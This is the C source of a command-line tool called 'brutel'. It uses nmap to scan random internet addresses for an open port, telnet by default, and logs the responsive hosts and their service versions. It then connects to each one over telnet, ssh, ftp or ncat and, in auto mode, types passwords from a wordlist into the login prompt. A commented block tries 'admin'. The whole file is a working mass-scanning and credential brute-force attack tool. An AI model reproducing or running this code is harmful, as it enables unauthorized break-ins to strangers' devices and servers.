//
//  main.m
//  brutel
//
//  Created by fairy-slipper on 12/26/15.
//  Copyright © 2015 fairy-slipper. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <unistd.h>
#include <stdarg.h>
#include <time.h>
#include <sys/time.h>
#include <pthread.h>
#include <sched.h>

#define MAXS 1024

void *time_out(void *arg);
void parse_ip();
void parse_version_ip(char *filename, char *addr);
void ctrlc_handler();
void ctrlz_handler();
void ctrlbslash_handler();
void safe_printf(const char *format, ...);

pthread_t timeout_t;

int fo = -1;
int so = -1;
pid_t  pid;
int status;

char *nmapoutname = "nmapout.txt";
char ipfilename[100];
char knocklist[100];
char port[11];
char irand[11];

char *token = (char *)NULL;

int main(int argc, const char * argv[]) {
    
    uid_t euid=geteuid();
    if (0!=euid) {
        printf("\nPlease run as root\n");
        exit(0);
    }
    
    signal(SIGINT, ctrlc_handler);
    signal(SIGTSTP, ctrlz_handler);
    
    int isdiscover = 0;
    int isknock = 0;
    int isversion = 0;
    int isauto = 0;
    int mark = 0;
    strcpy(ipfilename, "ip.txt");
    strcpy(knocklist, "klist.txt");
    strcpy(port, "23");
    strcpy(irand, "1000");
    
    if (argc == 1) {
        isdiscover = 1;
        isknock = 1;
    }
    
    for (int i=1; i<argc && argv[i][0]!='>'; i++) {
        if (!strcmp(argv[i],"-d") || !strcmp(argv[i],"--discover")) {
            if (mark) {
                break;
            }
            if (argv[i+1]!=NULL) {
                strcpy(ipfilename, argv[i+1]);
                i++;
            } else {
                printf("\nPlease specify an address list.\n");
                exit(0);
            }
            isdiscover = 1;
            mark = 1;
        } else if (!strcmp(argv[i],"-k") || !strcmp(argv[i],"--knock")) {
            if (mark) {
                break;
            }
            if (argv[i+1]!=NULL) {
                strcpy(ipfilename, argv[i+1]);
                i++;
            } else {
                printf("\nPlease specify an address list.\n");
                exit(0);
            }
            isknock = 1;
            mark = 1;
        } else if (!strcmp(argv[i],"-o") || !strcmp(argv[i],"--output")) {
            if (mark) {
                break;
            }
            if (argv[i+1]!=NULL) {
                strcpy(ipfilename, argv[i+1]);
                i++;
            } else {
                printf("\nPlease specify a name.\n");
                exit(0);
            }
            isdiscover = 1;
            isknock = 1;
            mark = 1;
        } else if (!strcmp(argv[i],"-p") || !strcmp(argv[i],"--port")) {
            if (argv[i+1]!=NULL) {
                strcpy(port, argv[i+1]);
                i++;
            } else {
                printf("\nPlease specify a port.\n");
                exit(0);
            }
            if (!isdiscover && !isknock && !isversion) {
                isdiscover = 1;
                isknock = 1;
            }
        } else if (!strcmp(argv[i],"-t") || !strcmp(argv[i],"--type")) {
            if (argv[i+1]!=NULL) {
                strcpy(ipfilename, argv[i+1]);
                i++;
            } else {
                printf("\nPlease specify a file.\n");
                exit(0);
            }
            isversion = 1;
            mark = 1;
        } else if (!strcmp(argv[i],"-n") || !strcmp(argv[i],"--numaddr")) {
            if (argv[i+1]!=NULL) {
                strcpy(irand, argv[i+1]);
                i++;
            } else {
                printf("\nPlease specify a value.\n");
                exit(0);
            }
            if (!isdiscover && !isknock && !isversion) {
                isdiscover = 1;
                isknock = 1;
            }
        } else if (!strcmp(argv[i],"-a") || !strcmp(argv[i],"--auto")) {
            if (argv[i+1]!=NULL) {
                if (argv[i+1][0]!='-') {
                    strcpy(irand, argv[i+1]);
                    i++;
                }
            }
            isauto = 1;
        } else if (!strcmp(argv[i],"-h") || !strcmp(argv[i],"--help")) {
            printf("Usage:\n");
            printf("    -o <filename>               runs -d and -k\n");
            printf("    -n <# of addr>              number of addr to search\n");
            printf("    -p <port>                   default 23\n");
            printf("    -d <filename>               creates file of addr whose ports are open\n");
            printf("    -t <filename>               version detection of addr\n");
            printf("    -k <filename>               creates connection for addr on specified port\n\n");
            printf("    -a <filename>               auto-knock using specified wordlist\n\n");
            printf("Default values\n");
            printf("    filename: ip.txt\n");
            printf("    port: 23\n");
            printf("    # of addr: 1000\n\n");
            exit(0);
        }
    }
    
    
    if (isdiscover) {
        safe_printf("Searching %s addresses port %s\nPlease wait...\n", irand, port);
        pid = fork();
        if (pid == 0) {
            fo = open(nmapoutname, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IRGRP | S_IWGRP | S_IWUSR);
            dup2(fo, 1);
            close(fo);
            char *execArgs[] = {"nmap", "-n", "-Pn", "-sS", "-p", port, "--open", "-iR", irand, NULL};
            int discoverSpawn = execvp(execArgs[0], execArgs);
            exit(0);
        } else {
            parse_ip();
        }
    }
    
    if (isversion) {
        
        FILE *ipfd = fopen(ipfilename, "rw+");
        
        char ipwithver[100];
        strcpy(ipwithver, "ver_");
        strcat(ipwithver, ipfilename);
        
        FILE *ipwithverfd = fopen(ipwithver, "w");
        fclose(ipwithverfd);
        
        char buf[1000];
        while (fgets(buf,1000, ipfd)!=NULL) {
            const char t[2] = " \n";
            token = strtok(buf, t);
            
            pthread_create(&timeout_t,NULL,time_out,NULL);
            
            pid = fork();
            if (pid == 0) {
                fo = open(nmapoutname, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IRGRP | S_IWGRP | S_IWUSR);
                so = dup(1);
                dup2(fo, 1);
                close(fo);
                char *execArgs[] = {"nmap", "-n", "-Pn", "-sV", "-p", port, token, NULL};
                int versionSpawn = execvp(execArgs[0], execArgs);
                dup2(so, 1);
                close(so);
                exit(0);
            } else {
                parse_version_ip(ipwithver, token);
            }
        }
    }
    
    if (isknock) {
        printf("Starting knock\n");
        FILE *ipfd = fopen(ipfilename, "rw+");
        char buf[1000];
        while (fgets(buf,1000, ipfd)!=NULL) {
            const char t[2] = " \n";
            token = strtok(buf, t);
            char *execArgs[100];
            if (!strcmp(port, "21")) {
                execArgs[0] = "ftp";
            } else if (!strcmp(port, "22")) {
                execArgs[0] = "ssh";
            } else if (!strcmp(port, "23")) {
                execArgs[0] = "telnet";
            } else {
                execArgs[0] = "ncat";
                execArgs[2] = port;
                execArgs[3] = "-v";
            }
            execArgs[1] = token;
            int fdp[2];
            pipe(fdp);
            pid = fork();
            
            if (isauto) {
                if (pid == 0) {
                    dup2(fdp[0], STDIN_FILENO);
                    close(fdp[0]);
                    int knockSpawn = execvp(execArgs[0], execArgs);
                } else {
                    int oldout = dup(1);
                    dup2(fdp[1], STDOUT_FILENO);
                    close(fdp[1]);
                    sleep(5);
                    
                    FILE *knocklistfd = fopen(knocklist, "r+");
                    
                    if (knocklistfd == NULL) {
                        printf("Error!!");
                    }
                    
                    char buf[1000];
                    while (fgets(buf,1000, knocklistfd)!=NULL) {
                        
                        const char t[2] = " \n";
                        token = strtok(buf, t);
                        strcat(token, "\r");
                        
                        for(int i=0; token!=NULL; i++) {
                            if (write(STDOUT_FILENO, token, strlen(token)) == -1) {
                                dup2(oldout, 1);
                                close(oldout);
                                printf("FAILED");
                                kill(pid, SIGKILL);
                                waitpid(-1, &status, 0);
                                break;
                            }
                            sleep(5);
                            token=strtok(NULL, t);
                        }
                    }
                    
//                    char *w = "admin\r";
//                    if (write(STDOUT_FILENO, w, strlen(w)) == -1) {
//                        dup2(oldout, 1);
//                        close(oldout);
//                        printf("FAILED");
//                        kill(pid, SIGKILL);
//                        waitpid(-1, &status, 0);
//                        break;
//                    }
//                    sleep(5);
//                    if (write(STDOUT_FILENO, w, strlen(w)) == -1) {
//                        dup2(oldout, 1);
//                        close(oldout);
//                        printf("FAILED");
//                        kill(pid, SIGKILL);
//                        waitpid(-1, &status, 0);
//                        break;
//                    }
//                    sleep(5);
                    dup2(oldout, 1);
                    close(oldout);
                    kill(pid, SIGKILL);
                    waitpid(-1, &status, 0);
                }
            } else {
                if (pid == 0) {
                    int knockSpawn = execvp(execArgs[0], execArgs);
                } else {
                    waitpid(-1, &status, 0);
                }
            }
        }
    }
    return 0;
}

void *time_out(void *arg) {
    usleep(15000000);
    safe_printf("%s timeout!\n", token);
    kill(pid, SIGINT);
    dup2(so, 1);
    close(so);
    return NULL;
}

void safe_printf(const char *format, ...)
{
    char buf[MAXS];
    va_list args;
    
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    write(1, buf, strlen(buf)); /* write is async-signal-safe */
}

void ctrlc_handler() {
    close(fo);
    kill(pid, SIGINT);
    dup2(so, 1);
    close(so);
    exit(0);
}

void ctrlz_handler() {
    safe_printf("\n");
    kill(pid, SIGINT);
}

void parse_version_ip(char *filename, char *addr) {
    waitpid(-1, &status, 0);
    pthread_cancel(timeout_t);
    FILE *nnapoutfd = fopen(nmapoutname, "r+");
    FILE *ipwithverfd = fopen(filename, "a");
    
    char buf[1000];
    int i = 0;
    while (fgets(buf,1000, nnapoutfd)!=NULL) {
        if (i==5) {
            fprintf(ipwithverfd, "%s\t%s", addr, buf);
            printf("%s\t%s",addr, buf);
        }
        i++;
    }
    fclose(ipwithverfd);
    fclose(nnapoutfd);
}
    
void parse_ip() {
    waitpid(-1, &status, 0);
    
    FILE *nmapoutfd = fopen(nmapoutname, "r+");
    FILE *ipfd = fopen(ipfilename, "w+");
    
    if (nmapoutfd == NULL) {
        printf("Error!!");
    }
    if (ipfd == NULL) {
        printf("Error!!");
    }
    
    char buf[1000];
    while (fgets(buf,1000, nmapoutfd)!=NULL) {
        
        const char t[2] = " \n";
        token = strtok(buf, t);
        
        int ipline = 0;
        
        for(int i=0; token!=NULL; i++) {
            if (i==0 && !strcmp(token, "Nmap")) {
                ipline = 1;
            } else if (ipline && i==4 && isdigit(token[0])) {
                fprintf(ipfd,"%s\n", token);
            }
            token=strtok(NULL, t);
        }
    }
    
    fclose(nmapoutfd);
    fclose(ipfd);
    
}